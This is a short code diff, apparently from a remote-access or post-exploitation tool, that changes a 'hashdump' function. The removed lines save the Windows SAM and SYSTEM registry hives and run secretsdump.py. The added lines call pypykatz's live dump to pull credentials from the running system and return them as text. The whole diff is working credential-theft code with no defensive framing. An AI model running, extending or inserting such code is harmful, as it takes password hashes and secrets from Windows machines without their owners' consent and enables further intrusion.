@@ -32,11 +32,18 @@ def execute_command(command):
 
 def hashdump():
     if platform.system() == "Windows":
-        command = "reg save HKLM\\SAM sam.save && reg save HKLM\\SYSTEM system.save"
-        subprocess.run(command, shell=True)
-        command = "secretsdump.py -sam sam.save -system system.save LOCAL"
-        result = subprocess.run(command, shell=True, capture_output=True, text=True)
-        return result.stdout + result.stderr
+        try:
+            import pypykatz
+            from pypykatz.pypykatz import pypykatz
+            from io import StringIO
+
+            # Dump the hashes from the SAM and SYSTEM files
+            result = pypykatz.go_live()
+            output = StringIO()
+            result.to_grepoutput(output)
+            return output.getvalue()
+        except Exception as e:
+            return str(e)
     else:
         return "Hashdump is only available on Windows systems."
 
